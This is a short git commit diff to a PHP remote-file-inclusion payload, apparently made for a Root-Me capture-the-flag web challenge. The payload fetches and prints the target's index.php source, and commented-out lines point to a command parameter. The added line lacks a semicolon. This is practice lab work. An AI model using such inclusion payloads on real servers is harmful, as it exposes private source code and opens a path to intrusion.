aa00a2d6a9d9b5ae290ececeb3545f3fe1ac4811
Josephine Vo <jovo123@gmail.com>
2016-02-16 01:02:25 -0800

    Update RFIscript_lang.php

--- RFIscript_lang.php
+++ RFIscript_lang.php
@@ -2,6 +2,7 @@
 	echo("success!\n");
         //$command = $_GET['cmd'];
         //echo $command."\n";
-        echo "wth\n";
-        show_source(__FILE__);
-
+        $yay = file_get_contents("http://challenge01.root-me.org/web-serveur/ch13/index.php")
+        echo $yay;
+        //show_source(__FILE__);
+?>
